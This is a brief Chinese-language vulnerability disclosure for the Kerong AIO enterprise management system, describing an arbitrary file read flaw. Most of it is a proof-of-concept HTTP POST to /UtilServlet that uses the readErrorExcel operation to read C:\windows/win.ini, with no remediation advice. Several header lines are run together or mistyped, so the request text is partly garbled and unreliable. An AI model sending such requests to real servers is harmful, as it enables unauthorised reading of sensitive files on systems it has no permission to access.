漏洞描述：科荣AIO 企业⼀体化管理解决⽅案 通过ERPERP（进销存财务）、OAOA（办公⾃动化）、CRMCRM（客⼾关系管理）、UDPUDP（⾃定义平台），集电⼦商务平台、⽀付平台、ERP 平台、微信平台、移动APP 等解决了众多企业客⼾在管理过程中跨部⻔、多功能、需求多变等通⽤及个性化的问题。科荣AIO 管理系统存在⽂件读取漏洞，攻击者可以读取敏感⽂件

```
POST /UtilServlet
HTTP/1.1
Host:
User-Agent: Mozilla/5.0 Windows NT 10.; Win64; x64) AppleWebKit/537.36 (KHTMIContent-Length: 52
Accept: text/html,application/xhtml+xml,application/xml;g=0.9,image/avif,image.Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,zh;g=0.9
Cache-Control: no-cache
Connection: close
Content-Type: application/x-www-form-urlencodedPragma: no-cache
Upgrade-Insecure-Requests: 1

operation=readErrorExcel&fileName=C:\windows/win.ini
```

